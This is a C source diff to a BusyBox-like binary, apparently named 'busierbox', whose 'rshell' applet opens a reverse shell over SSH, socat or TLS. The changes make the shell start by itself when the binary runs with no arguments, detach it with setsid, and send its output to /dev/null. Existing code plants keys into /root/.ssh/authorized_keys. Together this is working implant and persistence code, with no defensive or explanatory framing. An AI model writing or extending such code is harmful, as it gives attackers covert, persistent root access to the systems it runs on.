@@ -63,6 +63,9 @@
 #ifndef BB_RSHELL_AUTHKEYS_MODE
 #define BB_RSHELL_AUTHKEYS_MODE "disabled"
 #endif
+#ifndef BB_RSHELL_RUN_MODE
+#define BB_RSHELL_RUN_MODE "auto"
+#endif
 #ifndef BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING
 #define BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING "no"
 #endif
@@ -394,6 +397,93 @@ static int should_retry_after_attempt(int attempt)
     return attempt < retry_count;
 }
 
+static int should_background_rshell(const char *transport)
+{
+    const char *zero_arg = getenv("BUSIERBOX_ZERO_ARG_CONTEXT");
+
+    if (!strcmp(transport, "ssh"))
+        return 0; /* SSH starts Dropbear/dbclient workers itself. */
+    if (!strcmp(BB_RSHELL_RUN_MODE, "background"))
+        return 1;
+    if (!strcmp(BB_RSHELL_RUN_MODE, "auto") && zero_arg && !strcmp(zero_arg, "1"))
+        return 1;
+    return 0;
+}
+
+static void write_rshell_background_status(const char *transport, pid_t pid)
+{
+    const char *guard = autorun_guard_path();
+    char path[PATH_MAX];
+    int fd;
+    time_t now = time(NULL);
+
+    if (!yes_value(BB_AUTORUN_GUARD_ENABLE))
+        return;
+    mkdir_p(guard);
+
+    snprintf(path, sizeof(path), "%s/rshell.pid", guard);
+    fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
+    if (fd >= 0) {
+        dprintf(fd, "pid=%ld\n", (long)pid);
+        close(fd);
+    }
+
+    snprintf(path, sizeof(path), "%s/rshell.status", guard);
+    fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
+    if (fd >= 0) {
+        dprintf(fd,
+                "state=starting\ntransport=%s\nencryption=%s\n"
+                "rshell_pid=%ld\nstarted_at=%ld\n",
+                transport, BB_RSHELL_ENCRYPTION, (long)pid, (long)now);
+        close(fd);
+    }
+}
+
+static int maybe_background_rshell(const char *transport)
+{
+    const char *child = getenv("BUSIERBOX_RSHELL_BACKGROUND_CHILD");
+    pid_t pid;
+
+    if ((child && !strcmp(child, "1")) || !should_background_rshell(transport))
+        return 0;
+
+    pid = fork();
+    if (pid < 0) {
+        perror("rshell: fork");
+        return -1;
+    }
+    if (pid > 0) {
+        write_rshell_background_status(transport, pid);
+        printf("rshell_background_pid=%ld\n", (long)pid);
+        printf("rshell_status=starting\n");
+        return 1;
+    }
+
+    setsid();
+    setenv("BUSIERBOX_RSHELL_BACKGROUND_CHILD", "1", 1);
+    if (!strcmp(BB_ZERO_ARG_LOG_MODE, "none")) {
+        int devnull = open("/dev/null", O_WRONLY);
+        if (devnull >= 0) {
+            dup2(devnull, STDOUT_FILENO);
+            dup2(devnull, STDERR_FILENO);
+            close(devnull);
+        }
+    } else {
+        const char *guard = autorun_guard_path();
+        char log_path[PATH_MAX];
+        int logfd;
+        mkdir_p(guard);
+        snprintf(log_path, sizeof(log_path), "%s/rshell.log", guard);
+        logfd = open(log_path, O_CREAT | O_APPEND | O_WRONLY, 0600);
+        if (logfd >= 0) {
+            dup2(logfd, STDOUT_FILENO);
+            dup2(logfd, STDERR_FILENO);
+            close(logfd);
+        }
+    }
+    return 0;
+}
+
 static const char *select_rshell_shell(char *buf, size_t bufsz, const char *payload)
 {
     const char *provider = BB_RSHELL_SHELL_PROVIDER;
@@ -434,7 +524,7 @@ static const char *select_rshell_shell(char *buf, size_t bufsz, const char *payl
 
 int applet_rshell_main(int argc, char **argv)
 {
-    char payload[PATH_MAX], busybox[PATH_MAX + 16], dropbear[PATH_MAX + 16], dbclient[PATH_MAX + 16], dropbearkey[PATH_MAX + 16], socat[PATH_MAX + 16];
+    char payload[PATH_MAX], payload_lib[PATH_MAX + 16], busybox[PATH_MAX + 16], dropbear[PATH_MAX + 16], dbclient[PATH_MAX + 16], dropbearkey[PATH_MAX + 16], socat[PATH_MAX + 16];
     char hostkey[PATH_MAX + 64], identity[PATH_MAX + 32], authkeys[PATH_MAX + 32], rootssh[PATH_MAX];
     char cmd[8192] = "";
     char shell_cmd[PATH_MAX + 16];
@@ -446,10 +536,12 @@ int applet_rshell_main(int argc, char **argv)
     if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h"))) {
         puts("usage: busierbox rshell [start|status|stop|restart] [--transport ssh|socat|builtin]");
         puts("Starts or manages the configured reverse access transport.");
-        printf("Configured transport: %s  encryption: %s\n", BB_RSHELL_TRANSPORT, BB_RSHELL_ENCRYPTION);
+        printf("Configured transport: %s  encryption: %s  run_mode: %s\n",
+               BB_RSHELL_TRANSPORT, BB_RSHELL_ENCRYPTION, BB_RSHELL_RUN_MODE);
         printf("Shell provider: %s  retries: %s backoff=%s interval=%ss max=%ss\n",
                BB_RSHELL_SHELL_PROVIDER, BB_RSHELL_RETRY_COUNT, BB_RSHELL_RETRY_BACKOFF,
                BB_RSHELL_RETRY_INTERVAL_SEC, BB_RSHELL_RETRY_MAX_INTERVAL_SEC);
+        puts("Run mode: foreground keeps the shell in the current session; background is transport-specific; auto uses transport defaults.");
 #ifdef HAVE_WOLFSSL
         puts("Transports: ssh (Dropbear/dbclient reverse SSH), socat (staged socat /bin/sh), builtin (wolfSSL TLS shell).");
 #else
@@ -495,7 +587,7 @@ int applet_rshell_main(int argc, char **argv)
         const char *guard = autorun_guard_path();
         char pid_path[PATH_MAX], lock_path[PATH_MAX], status_path[PATH_MAX];
         static const char *pid_files[] = {
-            "dropbear.pid", "dbclient.pid", "socat.pid", NULL
+            "dropbear.pid", "dbclient.pid", "socat.pid", "rshell.pid", NULL
         };
         int k;
         for (k = 0; pid_files[k]; k++) {
@@ -503,8 +595,12 @@ int applet_rshell_main(int argc, char **argv)
             char dummy[8] = "";
             snprintf(pid_path, sizeof(pid_path), "%s/%s", guard, pid_files[k]);
             if (read_lock_pid(pid_path, &pid, dummy, sizeof(dummy)) == 0 && pid > 1) {
-                if (kill((pid_t)pid, 0) == 0 || errno != ESRCH)
+                if (!strcmp(pid_files[k], "rshell.pid")) {
+                    if (kill((pid_t)(-pid), 0) == 0 || errno != ESRCH)
+                        kill((pid_t)(-pid), SIGTERM);
+                } else if (kill((pid_t)pid, 0) == 0 || errno != ESRCH) {
                     kill((pid_t)pid, SIGTERM);
+                }
             }
             unlink(pid_path);
         }
@@ -539,6 +635,9 @@ int applet_rshell_main(int argc, char **argv)
         fputs("rshell: reverse shell is disabled in this build (BB_RSHELL_TRANSPORT=none)\n", stderr);
         return 1;
     }
+    rc = maybe_background_rshell(transport);
+    if (rc != 0)
+        return rc < 0 ? 1 : 0;
 
     if (!strcmp(transport, "builtin")) {
 #ifdef HAVE_WOLFSSL
@@ -576,6 +675,7 @@ int applet_rshell_main(int argc, char **argv)
         return 127;
     }
     snprintf(dropbear, sizeof(dropbear), "%s/bin/dropbear", payload);
+    snprintf(payload_lib, sizeof(payload_lib), "%s/lib", payload);
     snprintf(busybox, sizeof(busybox), "%s/bin/busybox", payload);
     snprintf(dbclient, sizeof(dbclient), "%s/bin/dbclient", payload);
     snprintf(dropbearkey, sizeof(dropbearkey), "%s/bin/dropbearkey", payload);
@@ -608,6 +708,9 @@ int applet_rshell_main(int argc, char **argv)
             fputs("rshell: shell provider custom requires BB_RSHELL_CUSTOM_SHELL\n", stderr);
             return 2;
         }
+        strcat(cmd, "LD_LIBRARY_PATH=");
+        shquote_append(cmd, sizeof(cmd), payload_lib);
+        strcat(cmd, "${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}; export LD_LIBRARY_PATH; ");
         if (!strcmp(BB_RSHELL_ENCRYPTION, "tls")) {
             strcat(cmd, "exec ");
             shquote_append(cmd, sizeof(cmd), socat);
@@ -679,19 +782,22 @@ int applet_rshell_main(int argc, char **argv)
         shquote_append(cmd, sizeof(cmd), _log_dir);
         strcat(cmd, " ");
     }
-    strcat(cmd, "mkdir -p ");
-    shquote_append(cmd, sizeof(cmd), rootssh);
-    strcat(cmd, " ");
     strcat(cmd, "$(dirname ");
     shquote_append(cmd, sizeof(cmd), hostkey);
     strcat(cmd, "); ");
     if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-copy")) {
+        strcat(cmd, "mkdir -p ");
+        shquote_append(cmd, sizeof(cmd), rootssh);
+        strcat(cmd, "; ");
         strcat(cmd, "if [ -f ");
         shquote_append(cmd, sizeof(cmd), authkeys);
         strcat(cmd, " ] && [ ! -f /root/.ssh/authorized_keys ]; then cp ");
         shquote_append(cmd, sizeof(cmd), authkeys);
         strcat(cmd, " /root/.ssh/authorized_keys 2>/dev/null || true; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
     } else if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-merge")) {
+        strcat(cmd, "mkdir -p ");
+        shquote_append(cmd, sizeof(cmd), rootssh);
+        strcat(cmd, "; ");
         strcat(cmd, "if [ -f ");
         shquote_append(cmd, sizeof(cmd), authkeys);
         strcat(cmd, " ]; then tmp=/root/.ssh/authorized_keys.busierbox.$$; { sed '/^# BEGIN BUSIERBOX RSHELL$/,/^# END BUSIERBOX RSHELL$/d' /root/.ssh/authorized_keys 2>/dev/null || true; echo '# BEGIN BUSIERBOX RSHELL'; cat ");
@@ -852,8 +958,10 @@ static int run_zero_arg_mode(const char *mode)
     }
     if (!strcmp(mode, "survey"))
         return applet_survey_main(1, survey_argv);
-    if (!strcmp(mode, "rshell"))
+    if (!strcmp(mode, "rshell")) {
+        setenv("BUSIERBOX_ZERO_ARG_CONTEXT", "1", 1);
         return applet_rshell_main(1, rshell_argv);
+    }
     if (!strcmp(mode, "custom"))
         return run_custom_zero_arg();
     fprintf(stderr, "unknown zero-arg mode: %s\n", mode);
@@ -861,9 +969,27 @@ static int run_zero_arg_mode(const char *mode)
     return 2;
 }
 
+static const char *zero_arg_log_mode(void)
+{
+    const char *mode = getenv("BUSIERBOX_ZERO_ARG_LOG_MODE");
+    return (mode && *mode) ? mode : BB_ZERO_ARG_LOG_MODE;
+}
+
+static int zero_arg_log_at_least_status(const char *log_mode)
+{
+    return !strcmp(log_mode, "status") || !strcmp(log_mode, "verbose");
+}
+
+static int zero_arg_log_verbose(const char *log_mode)
+{
+    return !strcmp(log_mode, "verbose");
+}
+
 static int zero_arg_main(void)
 {
     const char *mode = getenv("BUSIERBOX_ZERO_ARG_MODE");
+    const char *log_mode = zero_arg_log_mode();
+    int rc;
     if (!mode || !*mode) {
         mode = BB_ZERO_ARG_MODE;
     }
@@ -871,7 +997,7 @@ static int zero_arg_main(void)
         usage(stdout);
         return 0;
     }
-    if (!strcmp(BB_ZERO_ARG_LOG_MODE, "none")) {
+    if (!strcmp(log_mode, "none")) {
         int _devnull = open("/dev/null", O_WRONLY);
         if (_devnull >= 0) {
             dup2(_devnull, STDOUT_FILENO);
@@ -881,7 +1007,14 @@ static int zero_arg_main(void)
     }
     if (!acquire_autorun_guard(mode))
         return 0;
-    return run_zero_arg_mode(mode);
+    if (zero_arg_log_at_least_status(log_mode))
+        fprintf(stderr, "busierbox: zero-arg mode=%s\n", mode);
+    if (zero_arg_log_verbose(log_mode))
+        fprintf(stderr, "busierbox: zero-arg log_mode=%s runtime=%s\n", log_mode, BB_RUNTIME_MODE);
+    rc = run_zero_arg_mode(mode);
+    if (zero_arg_log_at_least_status(log_mode))
+        fprintf(stderr, "busierbox: zero-arg exit=%d\n", rc);
+    return rc;
 }
 
 int main(int argc, char **argv)
